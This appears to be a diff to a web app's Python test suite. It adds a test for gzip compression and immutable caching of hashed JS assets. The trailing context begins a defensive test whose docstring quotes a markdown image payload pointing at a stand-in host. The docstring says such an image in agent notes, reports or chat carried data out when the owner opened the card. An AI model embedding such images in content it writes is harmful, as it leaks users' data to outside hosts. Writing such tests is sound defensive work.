@@ -314,6 +314,22 @@ class ApiTests(unittest.TestCase):
         js = r.text.split('assets/')[1].split('"')[0]
         self.assertEqual(c.get(f'/assets/{js}').status_code, 200)
 
+    def test_hashed_assets_go_compressed_and_cached_for_good(self):
+        """The entry chunk is ~1.8 MB: raw and uncached it was most of a cold load. Gzip for a browser that asks, the same
+        bytes once decoded, and `immutable` because a new build renames every file."""
+        import gzip
+        js = c.get('/').text.split('assets/')[1].split('"')[0]
+        raw = c.get(f'/assets/{js}', headers={'Accept-Encoding': 'identity'})
+        self.assertNotIn('content-encoding', raw.headers)
+        self.assertIn('immutable', raw.headers['cache-control'])
+        gz = c.get(f'/assets/{js}', headers={'Accept-Encoding': 'gzip, deflate'})   # httpx decodes; the header says what came
+        self.assertEqual(gz.headers.get('content-encoding'), 'gzip')
+        self.assertEqual(gz.content, raw.content)
+        self.assertIn('immutable', gz.headers['cache-control']); self.assertEqual(gz.headers.get('vary'), 'Accept-Encoding')
+        self.assertLess(int(gz.headers['content-length']), len(raw.content) // 2)
+        self.assertEqual(c.get('/assets/no-such-file.js').status_code, 404)
+        self.assertIn('no-store', c.get('/').headers['cache-control'])                   # the page that names them never caches
+
     def test_the_page_loads_no_picture_from_another_site(self):
         """Agent notes, reports and chat render as markdown, and `![](https://x.example/?d=<data>)` in
         any of them was a request carrying that data out the moment the owner opened the card. No
